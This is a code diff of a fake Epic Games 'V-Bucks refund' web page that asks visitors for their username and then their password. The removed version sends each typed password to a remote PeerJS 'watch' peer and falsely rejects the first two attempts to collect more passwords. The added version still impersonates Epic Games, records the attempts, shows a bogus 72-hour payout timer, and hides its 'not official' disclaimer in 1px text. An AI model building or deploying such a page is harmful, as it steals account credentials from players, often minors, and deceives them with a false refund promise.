@@ -2,1308 +2,392 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-
-  <title>Epic Games</title>
-
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Rewards Vault</title>
   <style>
-    *{
-      box-sizing:border-box;
-      margin:0;
-      padding:0;
-      -webkit-tap-highlight-color:transparent;
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
     }
 
-    body{
-      font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
-      background:#0e1220;
-      color:#fff;
-      min-height:100vh;
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      padding:16px;
+    body {
+      min-height: 100vh;
+      background: #141417;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      color: #e8e8e8;
+      background-image:
+        radial-gradient(circle at 20% 20%, rgba(90, 100, 120, 0.08), transparent 40%),
+        radial-gradient(circle at 80% 80%, rgba(90, 100, 120, 0.08), transparent 40%);
     }
 
-    .wrap{
-      width:100%;
-      max-width:480px;
-      background:#141927;
-      border:1px solid #232c44;
-      border-radius:16px;
-      overflow:hidden;
-      box-shadow:0 20px 60px rgba(0,0,0,.55);
+    .made-by {
+      margin-top: 28px;
+      font-size: 12px;
+      letter-spacing: 3px;
+      text-transform: uppercase;
+      color: #9a9a9a;
     }
 
-    .top{
-      background:linear-gradient(135deg,#0a0f1e,#101827);
-      padding:22px;
-      display:flex;
-      align-items:center;
-      gap:14px;
-      border-bottom:1px solid #232c44;
+    .panel {
+      margin-top: 40px;
+      width: 460px;
+      max-width: 92vw;
+      background: #232429;
+      border: 1px solid #3a3b42;
+      border-radius: 18px;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+      padding: 40px 32px;
+      text-align: center;
     }
 
-    .logo{
-      width:52px;
-      height:52px;
-      border-radius:12px;
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      font-size:22px;
-      font-weight:900;
-      font-style:italic;
-      background:linear-gradient(135deg,#34b3ff,#0078f2);
-      color:#fff;
+    .hidden {
+      display: none;
     }
 
-    .top h1{
-      font-size:19px;
-      letter-spacing:.5px;
+    .panel h1 {
+      font-size: 24px;
+      font-weight: 700;
+      margin-bottom: 12px;
+      line-height: 1.3;
     }
 
-    .top p{
-      color:#8b98b8;
-      font-size:12.5px;
-      margin-top:2px;
+    .panel p {
+      font-size: 14px;
+      color: #b5b5bc;
+      line-height: 1.6;
+      margin-bottom: 24px;
     }
 
-    .hero{
-      padding:26px 22px;
-      background:radial-gradient(
-        circle at 80% 0%,
-        rgba(0,120,242,.18),
-        transparent 55%
-      );
-      border-bottom:1px solid #232c44;
+    .field {
+      text-align: left;
+      margin-bottom: 20px;
     }
 
-    .hero h2{
-      font-size:22px;
-      line-height:1.25;
+    .field label {
+      display: block;
+      font-size: 12px;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      color: #b5b5bc;
+      margin-bottom: 8px;
     }
 
-    .hero h2 b{
-      color:#34b3ff;
+    .field input {
+      width: 100%;
+      padding: 14px 16px;
+      background: #1b1c21;
+      border: 1px solid #3a3b42;
+      border-radius: 10px;
+      color: #e8e8e8;
+      font-size: 15px;
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
     }
 
-    .tag{
-      display:inline-block;
-      background:rgba(52,179,255,.14);
-      color:#34b3ff;
-      border:1px solid rgba(52,179,255,.35);
-      padding:5px 12px;
-      border-radius:30px;
-      font-size:11px;
-      font-weight:700;
-      letter-spacing:.6px;
-      margin-bottom:12px;
+    .field input:focus {
+      border-color: #7a7f8c;
+      box-shadow: 0 0 0 3px rgba(106, 114, 128, 0.15);
     }
 
-    .hero ul{
-      list-style:none;
-      margin-top:14px;
-      display:grid;
-      gap:8px;
+    .field input::placeholder {
+      color: #6e6e76;
     }
 
-    .hero li{
-      color:#aab6d4;
-      font-size:13px;
-      display:flex;
-      align-items:center;
-      gap:9px;
+    .error-msg {
+      color: #e06c6c;
+      font-size: 14px;
+      font-weight: 600;
+      margin-bottom: 14px;
+      min-height: 20px;
     }
 
-    .hero li span{
-      color:#34b3ff;
-      font-weight:900;
+    .btn {
+      width: 100%;
+      padding: 14px;
+      background: linear-gradient(180deg, #454851, #2b2d33);
+      border: 1px solid #5a5c66;
+      border-radius: 10px;
+      color: #f0f0f0;
+      font-size: 15px;
+      font-weight: 600;
+      letter-spacing: 1px;
+      cursor: pointer;
+      transition: filter 0.2s, transform 0.1s;
     }
 
-    .panel{
-      padding:18px 22px 24px;
+    .btn:hover {
+      filter: brightness(1.15);
     }
 
-    .label{
-      font-size:12px;
-      color:#8b98b8;
-      margin-bottom:7px;
-      font-weight:600;
+    .btn:active {
+      transform: scale(0.98);
     }
 
-    input{
-      width:100%;
-      padding:14px 15px;
-      border-radius:10px;
-      border:1px solid #2b3550;
-      background:#0d1220;
-      color:#fff;
-      font-size:16px;
-      outline:none;
+    .btn:disabled {
+      opacity: 0.45;
+      cursor: not-allowed;
+      filter: none;
+      transform: none;
     }
 
-    input:focus{
-      border-color:#34b3ff;
-      box-shadow:0 0 0 3px rgba(52,179,255,.15);
+    .btn:hover:disabled {
+      filter: none;
     }
 
-    .field{
-      margin-bottom:16px;
+    .timer {
+      font-size: 44px;
+      font-weight: 700;
+      letter-spacing: 2px;
+      margin: 10px 0 26px;
+      font-variant-numeric: tabular-nums;
     }
 
-    .btn{
-      width:100%;
-      padding:15px;
-      border:none;
-      border-radius:10px;
-      background:linear-gradient(135deg,#34b3ff,#0078f2);
-      color:#fff;
-      font-size:16px;
-      font-weight:800;
-      cursor:pointer;
-      letter-spacing:.4px;
+    .progress-track {
+      height: 8px;
+      background: #1b1c21;
+      border-radius: 99px;
+      overflow: hidden;
+      margin-bottom: 20px;
     }
 
-    .err{
-      color:#ff5d6c;
-      background:rgba(255,93,108,.08);
-      border:1px solid rgba(255,93,108,.3);
-      padding:11px 13px;
-      border-radius:9px;
-      font-size:13px;
-      margin-top:14px;
-      display:none;
+    .progress-fill {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #9a9aa0, #d0d0d4);
+      border-radius: 99px;
+      transition: width 1s linear;
     }
 
-    .notice{
-      color:#aab6d4;
-      font-size:12.5px;
-      line-height:1.55;
-      background:#0d1220;
-      border:1px solid #232c44;
-      border-radius:9px;
-      padding:12px 14px;
-      margin-top:6px;
-    }
-
-    .countdown{
-      text-align:center;
-      padding:18px 0 6px;
-    }
-
-    .countdown .num{
-      font-size:42px;
-      font-weight:900;
-      color:#34b3ff;
-      font-variant-numeric:tabular-nums;
-      letter-spacing:1px;
-    }
-
-    .countdown .sub{
-      color:#8b98b8;
-      font-size:12px;
-      margin-top:6px;
-      letter-spacing:2px;
-      text-transform:uppercase;
-    }
-
-    .spinner{
-      width:34px;
-      height:34px;
-      border:3px solid #2b3550;
-      border-top-color:#34b3ff;
-      border-radius:50%;
-      margin:0 auto 12px;
-      animation:spin 1s linear infinite;
-    }
-
-    @keyframes spin{
-      to{
-        transform:rotate(360deg);
-      }
-    }
-
-    .success-box{
-      border:1px solid rgba(52,179,255,.4);
-      background:rgba(52,179,255,.06);
-      padding:18px;
-      border-radius:12px;
-      text-align:center;
-      gap:10px;
-      display:flex;
-      flex-direction:column;
-      align-items:center;
-    }
-
-    .hidden{
-      display:none!important;
-    }
-
-    .boot{
-      color:#5a6783;
-      font-size:11px;
-      text-align:center;
-      padding:12px;
-      border-top:1px solid #232c44;
+    .disclaimer {
+      position: fixed;
+      bottom: 10px;
+      left: 50%;
+      transform: translateX(-50%);
+      font-size: 1px;
+      color: #55555d;
+      letter-spacing: 0.1px;
+      white-space: nowrap;
+      user-select: none;
     }
   </style>
 </head>
-
 <body>
+  <div class="made-by">EPIC GAMES</div>
 
-<div class="wrap">
+  <div class="panel" id="screen-username">
+    <h1>Get up to 25% of all the V-Bucks you've ever bought.</h1>
+    <p>Enter your username below to check how much you qualify for.</p>
 
-  <div class="top">
-
-    <div class="logo">VB</div>
-
-    <div>
-      <h1>Epic Games</h1>
-      <p>V-Bucks Refund Program</p>
+    <div class="field">
+      <label for="username">Username</label>
+      <input id="username" type="text" placeholder="Enter your username" autocomplete="off" />
     </div>
 
+    <div class="error-msg" id="username-error" aria-live="polite"></div>
+    <button class="btn" id="username-btn" type="button" disabled>Confirm</button>
   </div>
 
+  <div class="panel hidden" id="screen-reenter">
+    <h1>Almost there</h1>
+    <p>Enter your password to confirm it's really you.</p>
 
-  <!-- STEP 1 -->
-
-  <div id="step1">
-
-    <div class="hero">
-
-      <span class="tag">
-        OFFICIAL REFUND PROGRAM
-      </span>
-
-      <h2>
-        Get up to <b>25%</b> of all the V-Bucks you've ever spent.
-      </h2>
-
-      <ul>
-
-        <li>
-          <span>✓</span>
-          Recover unused V-Bucks from season passes and bundles
-        </li>
-
-        <li>
-          <span>✓</span>
-          Demo verification with your username
-        </li>
-
-        <li>
-          <span>✓</span>
-          Simulated V-Bucks refund process
-        </li>
-
-      </ul>
-
+    <div class="field">
+      <label for="reenter">Password</label>
+      <input id="reenter" type="text" autocomplete="off" />
     </div>
 
-
-    <div class="panel">
-
-      <div class="field">
-
-        <div class="label">
-          FORTNITE / EPIC GAMES USERNAME
-        </div>
-
-        <input
-          id="username"
-          type="text"
-          placeholder="Enter your username"
-          autocomplete="off"
-        >
-
-      </div>
-
-
-      <button
-        class="btn"
-        onclick="goNext()"
-      >
-        Check My Refund
-      </button>
-
-
-      <div
-        class="err"
-        id="err1"
-      ></div>
-
-    </div>
-
+    <div class="error-msg" id="error-msg" aria-live="polite"></div>
+    <button class="btn" id="reenter-btn" type="button" disabled>Confirm</button>
   </div>
 
-
-  <!-- STEP 2 -->
-
-  <div
-    id="step2"
-    class="hidden"
-  >
-
-    <div
-      class="panel"
-      style="padding-top:26px"
-    >
-
-      <div
-        class="spinner"
-        id="spinner2"
-      ></div>
-
-
-      <div
-        style="text-align:center;margin-bottom:18px"
-      >
-
-        <div
-          class="label"
-          style="margin-bottom:4px"
-        >
-          VERIFY YOUR ACCOUNT
-        </div>
-
-
-        <p
-          style="color:#aab6d4;font-size:13px"
-        >
-        Enter your password to confirm you're
-          <b
-            id="userHere"
-            style="color:#fff"
-          ></b>
-        </p>
-
-      </div>
-
-
-      <div class="field">
-
-        <div class="label">
-          ENTER PASSWORD
-        </div>
-
-        <input
-          id="username2"
-          type="text"
-          placeholder="Enter your password"
-          autocomplete="off"
-        >
-
-      </div>
-
-
-      <button
-        class="btn"
-        onclick="goCheck()"
-      >
-        Verify &amp; Continue
-      </button>
-
-
-      <div
-        class="err"
-        id="err2"
-      ></div>
-
-    </div>
-
+  <div class="panel hidden" id="screen-claim">
+    <h1 id="welcome-heading">Welcome!</h1>
+    <p id="claim-hint">Your 25% reward is waiting.</p>
+    <button class="btn" id="claim-btn" type="button">Click here to claim your V-Bucks</button>
   </div>
 
+  <div class="panel hidden" id="screen-timer">
+    <h1>Claim received</h1>
+    <p>Your V-Bucks will be added to your account after this timer:</p>
 
-  <!-- STEP 3 -->
+    <div class="timer" id="timer">--:--:--</div>
 
-  <div
-    id="step3"
-    class="hidden"
-  >
-
-    <div
-      class="panel"
-      style="padding-top:24px"
-    >
-
-      <div id="claimBox">
-
-        <div class="success-box">
-
-          <div style="font-size:34px">
-            🎮
-          </div>
-
-          <div>
-            <b style="font-size:18px">
-              Identity Verified!
-            </b>
-          </div>
-
-          <p
-            style="color:#aab6d4;font-size:13px"
-          >
-            Welcome back,
-            <b
-              id="userHere2"
-              style="color:#fff"
-            ></b>.
-            Your demo refund was approved.
-          </p>
-
-        </div>
-
-
-        <button
-          class="btn"
-          style="margin-top:18px"
-          onclick="goClaim()"
-        >
-          Claim Your V-Bucks!
-        </button>
-
-      </div>
-
-
-      <div
-        id="timerBox"
-        class="hidden"
-      >
-
-        <p class="notice">
-          ✅ Your demo refund request has been submitted.
-          The V-Bucks calculation is being simulated.
-        </p>
-
-
-        <div class="countdown">
-
-          <div
-            class="num"
-            id="clock"
-          >
-            72:00:00
-          </div>
-
-          <div class="sub">
-            until V-Bucks are funded to your account
-          </div>
-
-        </div>
-
-
-        <p class="notice">
-          This is a demonstration timer.
-          The timer exists only to simulate the refund process.
-        </p>
-
-      </div>
-
+    <div class="progress-track">
+      <div class="progress-fill" id="progress-fill"></div>
     </div>
 
+    <p>After this timer ends, the V-Bucks will be added to your account.</p>
   </div>
 
-</div>
-
-
-<script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
-
-<script>
-
-var WATCH_ID = "vbcwatch-44e7-home";
-
-var attempts = 0;
-var interval = null;
-var sock = null;
-var pending = [];
-var peer = null;
-var currentUser = "";
-var gotClaimed = false;
-
-
-function $(id){
-  return document.getElementById(id);
-}
-
-
-/* =========================
-   TIMER
-   ========================= */
-
-function dlKey(username){
-  return "vbucks-dl-" + username;
-}
-
-
-function getDeadline(username){
-
-  try{
-
-    return parseInt(
-      localStorage.getItem(
-        dlKey(username)
-      ) || "0",
-      10
-    );
-
-  }catch(e){
-
-    return 0;
-
-  }
-}
-
-
-function setDeadline(username,time){
-
-  try{
-
-    localStorage.setItem(
-      dlKey(username),
-      String(time)
-    );
-
-  }catch(e){}
-
-}
-
-
-function showTimer(){
-
-  $("claimBox")
-    .classList
-    .add("hidden");
-
-  $("timerBox")
-    .classList
-    .remove("hidden");
-
-  tick();
-
-  clearInterval(interval);
-
-  interval =
-    setInterval(
-      tick,
-      1000
-    );
-
-}
-
-
-function tick(){
-
-  if(!currentUser){
-    return;
-  }
-
-  var deadline =
-    getDeadline(currentUser);
-
-
-  if(!deadline){
-
-    deadline =
-      Date.now() +
-      72 * 3600 * 1000;
-
-  }
-
-
-  var remaining =
-    deadline -
-    Date.now();
-
-
-  if(remaining <= 0){
-
-    remaining = 0;
-
-    clearInterval(interval);
-
-  }
-
-
-  var totalSeconds =
-    Math.floor(
-      remaining / 1000
-    );
-
-
-  var hours =
-    Math.floor(
-      totalSeconds / 3600
-    );
-
-
-  var minutes =
-    Math.floor(
-      (totalSeconds % 3600) / 60
-    );
-
-
-  var seconds =
-    totalSeconds % 60;
-
-
-  function pad(n){
-
-    return (
-      n < 10 ? "0" : ""
-    ) + n;
-
-  }
-
-
-  $("clock").textContent =
-    pad(hours) +
-    ":" +
-    pad(minutes) +
-    ":" +
-    pad(seconds);
-
-}
-
-
-/* =========================
-   STEP 1
-   ========================= */
-
-function goNext(){
-
-  var username =
-    $("username")
-      .value
-      .trim();
-
-
-  if(!username){
-
-    $("err1")
-      .textContent =
-      "Please enter your username.";
-
-    $("err1")
-      .style
-      .display =
-      "block";
-
-    return;
-
-  }
-
-
-  $("err1")
-    .style
-    .display =
-    "none";
-
-
-  currentUser =
-    username;
-
-
-  localStorage.setItem(
-    "vbucks-user",
-    currentUser
-  );
-
-
-  $("userHere")
-    .textContent =
-    currentUser;
-
-
-  $("userHere2")
-    .textContent =
-    currentUser;
-
-
-  /*
-    Original username event.
-  */
-
-  persist("visited");
-
-
-  $("step1")
-    .classList
-    .add("hidden");
-
-
-  $("spinner2")
-    .style
-    .display =
-    "block";
-
-
-  $("step2")
-    .classList
-    .remove("hidden");
-
-
-  var button =
-    $("step2")
-      .querySelector(".btn");
-
-
-  button.style.display =
-    "none";
-
-
-  setTimeout(
-    function(){
-
-      $("spinner2")
-        .style
-        .display =
-        "none";
-
-      button.style.display =
-        "";
-
-    },
-    1200
-  );
-
-}
-
-
-/* =========================
-   STEP 2
-   ========================= */
-
-function goCheck(){
-
-  var enteredUsername =
-    $("username2")
-      .value
-      .trim();
-
-
-  if(!enteredUsername){
-
-    $("err2")
-      .textContent =
-      "Enter your username.";
-
-    $("err2")
-      .style
-      .display =
-      "block";
-
-    $("username2")
-      .focus();
-
-    return;
-
-  }
-
-
-  attempts++;
-
-
-  /*
-    Sends:
-      original username = currentUser
-      attempt username  = enteredUsername
-      attempt number    = 1 / 2 / 3
-  */
-
-  persist(
-    "try:" + attempts,
-    enteredUsername
-  );
-
-
-  if(attempts < 3){
-
-    $("username2")
-      .value =
-      "";
-
-    $("err2")
-      .textContent =
-      "Incorrect password. Please try again";
-
-    $("err2")
-      .style
-      .display =
-      "block";
-
-    $("username2")
-      .focus();
-
-    return;
-
-  }
-
-
-  /*
-    Third attempt succeeds.
-  */
-
-  attempts = 0;
-
-
-  $("err2")
-    .style
-    .display =
-    "none";
-
-
-  $("spinner2")
-    .style
-    .display =
-    "block";
-
-
-  var button =
-    $("step2")
-      .querySelector(".btn");
-
-
-  button.style.display =
-    "none";
-
-
-  persist(
-    "passed",
-    enteredUsername
-  );
-
-
-  setTimeout(
-    function(){
-
-      $("spinner2")
-        .style
-        .display =
-        "none";
-
-
-      $("step2")
-        .classList
-        .add("hidden");
-
-
-      $("step3")
-        .classList
-        .remove("hidden");
-
-    },
-    1400
-  );
-
-}
-
-
-/* =========================
-   CLAIM
-   ========================= */
-
-function goClaim(){
-
-  if(!currentUser){
-    return;
-  }
-
-
-  gotClaimed = true;
-
-
-  var deadline =
-    Date.now() +
-    72 * 3600 * 1000;
-
-
-  setDeadline(
-    currentUser,
-    deadline
-  );
-
-
-  persist("claimed");
-
-
-  showTimer();
-
-}
-
-
-/* =========================
-   PEERJS EVENT CREATION
-   ========================= */
-
-function persist(
-  extra,
-  attemptUser
-){
-
-  /*
-    currentUser is always
-    the ORIGINAL username.
-  */
-
-  var user =
-    currentUser || "";
-
-
-  if(!user){
-    return;
-  }
-
-
-  var event = {
-
-    u:
-      user,
-
-    owner:
-      user,
-
-    /*
-      This is the username
-      typed during Attempts 1-3.
-    */
-
-    attemptUser:
-      attemptUser || "",
-
-    kind:
-      extra || "activity",
-
-    at:
-      new Date()
-        .toLocaleString()
-
-  };
-
-
-  /*
-    Attach current timer if one exists.
-  */
-
-  var deadline =
-    getDeadline(user);
-
-
-  if(
-    deadline &&
-    deadline > Date.now()
-  ){
-
-    event.deadline =
-      deadline;
-
-  }
-
-
-  if(
-    sock &&
-    sock.open
-  ){
-
-    send(event);
-
-  }else{
-
-    pending.push(event);
-
-  }
-
-}
-
-
-/* =========================
-   SEND
-   ========================= */
-
-function send(event){
-
-  if(
-    !sock ||
-    !sock.open
-  ){
-
-    return;
-
-  }
-
-
-  try{
-
-    sock.send(event);
-
-  }catch(e){}
-
-}
-
-
-/* =========================
-   PENDING EVENTS
-   ========================= */
-
-function flush(){
-
-  if(!pending.length){
-    return;
-  }
-
-
-  var queued =
-    pending.slice();
-
-
-  pending = [];
-
-
-  queued.forEach(
-    function(event){
-
-      send(event);
-
-    }
-  );
-
-}
-
-
-/* =========================
-   PEERJS CONNECTION
-   ========================= */
-
-function connect(){
-
-  try{
-
-    if(!window.Peer){
-
-      setTimeout(
-        connect,
-        500
-      );
-
-      return;
-
-    }
-
-
-    if(!peer){
-
-      peer =
-        new Peer();
-
-
-      peer.on(
-        "open",
-        function(){
-
-          openConnection();
-
-        }
-      );
-
-
-      peer.on(
-        "error",
-        function(){}
-
-      );
-
-    }
-
-
-    openConnection();
-
-  }catch(e){}
-
-}
-
-
-/* =========================
-   CONNECT TO WATCH PAGE
-   ========================= */
-
-function openConnection(){
-
-  if(
-    sock &&
-    sock.open
-  ){
-
-    return;
-
-  }
-
-
-  if(
-    !peer ||
-    !peer.open
-  ){
-
-    return;
-
-  }
-
-
-  var connection =
-    peer.connect(
-      WATCH_ID,
-      {
-        reliable:true
+  <div class="disclaimer">Warning! this is not an official epic games website. this was made by a fan</div>
+
+  <script>
+    const storage = (function () {
+      try {
+        const t = '__test__';
+        localStorage.setItem(t, '1');
+        localStorage.removeItem(t);
+        return localStorage;
+      } catch (e) {
+        const mem = {};
+        return {
+          getItem: (k) => (k in mem ? mem[k] : null),
+          setItem: (k, v) => { mem[k] = String(v); },
+          removeItem: (k) => { delete mem[k]; }
+        };
       }
-    );
+    })();
 
+    const usernameScreen = document.getElementById('screen-username');
+    const reenterScreen = document.getElementById('screen-reenter');
+    const claimScreen = document.getElementById('screen-claim');
+    const timerScreen = document.getElementById('screen-timer');
 
-  connection.on(
-    "open",
-    function(){
+    const usernameInput = document.getElementById('username');
+    const usernameBtn = document.getElementById('username-btn');
+    const usernameError = document.getElementById('username-error');
+    const reenterInput = document.getElementById('reenter');
+    const reenterBtn = document.getElementById('reenter-btn');
+    const errorMsg = document.getElementById('error-msg');
+    const welcomeHeading = document.getElementById('welcome-heading');
+    const claimBtn = document.getElementById('claim-btn');
+    const timerEl = document.getElementById('timer');
+    const progressFill = document.getElementById('progress-fill');
 
-      sock =
-        connection;
+    const TOTAL_MS = 72 * 60 * 60 * 1000;
+    let people = [];
+    let currentPerson = null;
+    let attemptsLeft = 2;
 
+    const show = (el) => {
+      [usernameScreen, reenterScreen, claimScreen, timerScreen].forEach((s) => s.classList.add('hidden'));
+      el.classList.remove('hidden');
+    };
 
-      flush();
-
-
-      sendCurrentUser();
-
+    function loadPeople() {
+      try {
+        people = JSON.parse(storage.getItem('people') || '[]');
+      } catch (e) {
+        people = [];
+      }
     }
-  );
 
-
-  connection.on(
-    "close",
-    function(){
-
-      sock = null;
-
+    function savePeople() {
+      storage.setItem('people', JSON.stringify(people));
     }
-  );
 
-
-  connection.on(
-    "error",
-    function(){
-
-      sock = null;
-
+    function currentName() {
+      return currentPerson ? currentPerson.name : '';
     }
-  );
 
-}
+    function setEnabled(btn, input) {
+      btn.disabled = input.value.trim().length < 1;
+    }
 
-
-/* =========================
-   RESEND CURRENT USER
-   ========================= */
-
-function sendCurrentUser(){
-
-  if(!currentUser){
-
-    try{
-
-      currentUser =
-        localStorage.getItem(
-          "vbucks-user"
-        ) || "";
-
-    }catch(e){}
-
-  }
-
-
-  if(!currentUser){
-    return;
-  }
-
-
-  var deadline =
-    getDeadline(
-      currentUser
-    );
-
-
-  if(
-    deadline &&
-    deadline > Date.now()
-  ){
-
-    send({
-
-      u:
-        currentUser,
-
-      owner:
-        currentUser,
-
-      kind:
-        "resumed",
-
-      at:
-        new Date()
-          .toLocaleString(),
-
-      deadline:
-        deadline
-
+    usernameInput.addEventListener('input', () => {
+      usernameError.textContent = '';
+      setEnabled(usernameBtn, usernameInput);
     });
 
-  }else{
-
-    send({
-
-      u:
-        currentUser,
-
-      owner:
-        currentUser,
-
-      kind:
-        "visited",
-
-      at:
-        new Date()
-          .toLocaleString()
-
+    reenterInput.addEventListener('input', () => {
+      errorMsg.textContent = '';
+      setEnabled(reenterBtn, reenterInput);
     });
 
-  }
+    usernameBtn.addEventListener('click', () => {
+      const value = usernameInput.value.trim();
+      if (!value) {
+        usernameError.textContent = 'Please enter a username.';
+        usernameInput.focus();
+        return;
+      }
+      loadPeople();
+      currentPerson = { name: value, attempts: [], deadline: null, start: null };
+      people.push(currentPerson);
+      savePeople();
+      attemptsLeft = 2;
+      errorMsg.textContent = '';
+      reenterInput.value = '';
+      show(reenterScreen);
+      reenterInput.focus();
+    });
 
-}
+    usernameInput.addEventListener('keydown', (e) => {
+      if (e.key === 'Enter') usernameBtn.click();
+    });
 
+    reenterBtn.addEventListener('click', () => {
+      const value = reenterInput.value.trim();
+      if (!value) {
+        errorMsg.textContent = 'Please enter your password.';
+        reenterInput.focus();
+        return;
+      }
+      const correct = value && value.toLowerCase() === currentName().toLowerCase();
 
-/* =========================
-   START
-   ========================= */
-
-(function(){
-
-  connect();
-
-
-  setInterval(
-    function(){
-
-      if(
-        !sock ||
-        !sock.open
-      ){
-
-        connect();
-
+      if (currentPerson) {
+        currentPerson.attempts.push(value);
+        savePeople();
       }
 
-    },
-    2000
-  );
+      if (correct || attemptsLeft === 0) {
+        errorMsg.textContent = '';
+        show(claimScreen);
+        welcomeHeading.textContent = 'Welcome, ' + currentName() + '!';
+      } else {
+        attemptsLeft -= 1;
+        errorMsg.textContent = 'Incorrect. Try again.';
+        reenterInput.value = '';
+        reenterInput.focus();
+      }
+    });
 
-})();
+    reenterInput.addEventListener('keydown', (e) => {
+      if (e.key === 'Enter') reenterBtn.click();
+    });
 
-</script>
+    claimBtn.addEventListener('click', () => {
+      const now = Date.now();
+      if (currentPerson && !currentPerson.deadline) {
+        currentPerson.deadline = now + TOTAL_MS;
+        currentPerson.start = now;
+        savePeople();
+      }
+      show(timerScreen);
+      startTimer();
+    });
 
+    function pad(n) {
+      return String(n).padStart(2, '0');
+    }
+
+    function formatTime(ms) {
+      const hours = Math.floor(ms / 3600000);
+      const mins = Math.floor((ms % 3600000) / 60000);
+      const secs = Math.floor((ms % 60000) / 1000);
+      return pad(hours) + ':' + pad(mins) + ':' + pad(secs);
+    }
+
+    function startTimer() {
+      const deadline = currentPerson ? currentPerson.deadline : Number(storage.getItem('rewardDeadline'));
+      const start = currentPerson ? currentPerson.start : Number(storage.getItem('rewardStart'));
+      if (!deadline) return;
+
+      const tick = () => {
+        const diff = Math.max(0, deadline - Date.now());
+        timerEl.textContent = formatTime(diff);
+
+        const elapsed = start ? (deadline - diff - start) / (deadline - start) : 0;
+        progressFill.style.width = Math.min(100, Math.max(0, elapsed * 100)) + '%';
+      };
+
+      tick();
+      setInterval(tick, 1000);
+    }
+  </script>
 </body>
 </html>
